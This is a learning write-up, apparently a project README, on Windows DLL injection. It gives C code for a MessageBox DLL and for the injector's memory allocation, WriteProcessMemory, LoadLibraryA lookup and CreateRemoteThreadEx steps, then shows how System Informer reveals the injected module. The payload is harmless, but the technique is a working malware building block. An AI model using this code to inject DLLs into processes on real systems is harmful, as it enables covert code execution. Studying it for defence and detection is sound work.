# Dll Injection

## Table of Contents

- [Dll Injection](#dll-injection)
  - [Table of Contents](#table-of-contents)
  - [Project Description](#project-description)
  - [Necessary knowledge](#necessary-knowledge)
    - [What is a Dll?](#what-is-a-dll)
    - [Dangers of Dll](#dangers-of-dll)
  - [Malware development](#malware-development)
    - [Dll creation](#dll-creation)
    - [Coding](#coding)
      - [Code Refactor - Error Handling](#code-refactor---error-handling)
      - [Allocating \& writing memory](#allocating--writing-memory)
      - [Get Module Handle \& LoadLibrary address](#get-module-handle--loadlibrary-address)
      - [Remote thread creation](#remote-thread-creation)
  - [Malware in action](#malware-in-action)
  - [Detection](#detection)
    - [System Informer](#system-informer)
    - [Skills Learned](#skills-learned)

## Project Description

Second project in my malware development journey resolves around Dll injection. Main goal of the project is to better understand Dlls in general because they are often used as a vector of attack. Malware structure will be similar to first project but instead of shellcode I will use my own custom dll to create a MessageBox in selected process.

## Necessary knowledge

### What is a Dll?

A **DLL** (Dynamic-Link Library) is a type of library used by Windows programs to share code dynamically at runtime, unlike static libraries. DLLs offer advantages such as reducing memory usage by allowing multiple programs to access the same code simultaneously and saving disk space since the library doesn't need to be embedded directly in the program.

### Dangers of Dll

Dll is often used as a vector of many different attacks. It can be dangerous because it might help an attacker to hide malicious code because Dlls can be dynamically loaded to legit process running on Windows. In this project I focus on simple Dll injection to familiarize myself with it but there are attacks like Dll reflection or Hijacking which I want to try perform in the future.

## Malware development

### Dll creation

Simple Dll that I want to use to learn dll injection is my custom one that will only display a simple MessageBox using Windows API.

To create Dll I will use syntax from microsoft documentation of a special function DllMain which is used when:
- DLL_PROCESS_ATTACH: Dll is loaded into the virtual address space of the process
- DLL_PROCESS_DETACH: Dll is being unloaded from the virtual address space of the process
- DLL_THREAD_ATTACH: Process is creating a new thread
- DLL_THREAD_DETACH: Process is cleanly ending a thread

To create simple Dll I will focus on the most popular one DLL_PROCESS_ATTACH
```c
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL, // handle to DLL module
    DWORD fdwReason,    // reason for calling function
    LPVOID lpvReserved) // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "This is message from DLL", "Hello Sir!", MB_OK);
        break;
    }
    return TRUE;
}
```

Next step is to compile Dll. I'm using MINGW with -shared option to create dll file.

To test if Dll works we can use rundll32.exe which is program on Windows that will allow us to run specified function of dll (in our case DllMain)
![](images/2024-12-22-23-42-42.png)

Now we confirmed that dll works.

### Coding

I will skip fragments like searching for PID of the process because it is the same code as in the previous project of shellcode injection and focus only on new things.

#### Code Refactor - Error Handling

To not duplicate code I created function to handle errors
```c
void HandleError(char *message, DWORD errorCode, HANDLE hTargetProcess, HANDLE hModule, LPVOID pAllocatedMemory, HANDLE hThread)
{
    if (message)
    {
        printf("ERROR: %s: %d\n", message, errorCode);
    }
    if (pAllocatedMemory)
    {
        VirtualFreeEx(hTargetProcess, pAllocatedMemory, 0, MEM_RELEASE);
    }
    if (hThread)
    {
        CloseHandle(hThread);
    }
    if (hModule)
    {
        CloseHandle(hModule);
    }
    if (hTargetProcess)
    {
        CloseHandle(hTargetProcess);
    }
}
```

#### Allocating & writing memory

```c
// ------------------ ALLOCATE MEMORY ------------------
    pAllocatedMemory = VirtualAllocEx(hTargetProcess, NULL, DllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (pAllocatedMemory == NULL)
    {
        HandleError("Failed to allocate memory", GetLastError(), hTargetProcess, NULL, NULL, NULL);
        return 1;
    }
    printf("SUCCESS: Memory allocated at address: 0x%p\n", pAllocatedMemory);

    // ------------------ WRITE ALLOCATED MEMORY ------------------
    WriteProcessMemory(hTargetProcess, pAllocatedMemory, DllName, DllPathSize, NULL);
    printf("SUCCESS: Memory written\n");
```

The difference between this and last project is that because there is no shellcode we only have to allocate path size of the dll and write the full path to the memory. I will explain later why.

#### Get Module Handle & LoadLibrary address

```c
// ------------------ GET KERNEL32 HMODULE ------------------
    hModule = GetModuleHandleA("Kernel32");
    if (hModule == NULL)
    {
        HandleError("Failed to retrieve module handle", GetLastError(), hTargetProcess, NULL, pAllocatedMemory, NULL);
        return 1;
    }

    // ------------------ GET LOADLIBRARYA ADDRESS ------------------
    LPTHREAD_START_ROUTINE loadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
    if (loadLibraryAddress == NULL)
    {
        HandleError("Failed to find load library address", GetLastError(), hTargetProcess, hModule, pAllocatedMemory, NULL);
        return 1;
    }
```

Same as in the shellcode injection the next step will be to create thread, however it needs to load our Dll. To allow this we have to get handle to Kernel32.dll in which is located LoadLibraryA function which address we need to tell the newly created thread to use to load our custom dll.

Most of the time Kernel32.dll is loaded in to the memory address space in all of the processes under the same address and because of that we can use GetProcAddress to know address of this function loaded in our process but it should be the same in target process.

#### Remote thread creation

```c
// ------------------ CREATE THREAD TO EXECUTE SHELLCODE ------------------
    hCreatedThread = CreateRemoteThreadEx(hTargetProcess, NULL, 0, loadLibraryAddress, pAllocatedMemory, 0, 0, NULL);
    if (hCreatedThread == NULL)
    {
        HandleError("Failed to create thread", GetLastError(), hTargetProcess, hModule, pAllocatedMemory, NULL);
        return 1;
    }
    printf("SUCCESS: Thread created\n");
```

Different from shell code injection we can see loadLibraryAddress and pAllocatedMemory provided to CreateRemoteThreadEx function
First one is allowing us to tell new created thread to start execution from that address (which is our LoadLibraryA address)
Second one is argument that will be provided to LoadLibraryA function -> in our case it is pointer to allocated memory in target process. It is necessary because we couldn't provide directly data from our process because target process doesn't have access to our address space.

## Malware in action

I'm running dll injection on mspaint.exe process

![](images/2024-12-23-16-01-41.png)

As we can see the injection was successful beacuse mspaint process displayed MessageBox however I would like to check modules using System Informer

## Detection

### System Informer

![](images/2024-12-23-16-03-56.png)

Using System Informer we can see that mspaint does not have any children processes however in the modules tab we can see our custom-dll loaded. If we click on it to check further information we can see that it is unverified so it is easy to detect

The program on it's own doesn't have to be malicious because it performs simple dll injection however it also allows us to inject a malicious dll

### Skills Learned
- DLL general knowledge
- DLL injection
- Windows API
- Memory Address Space of process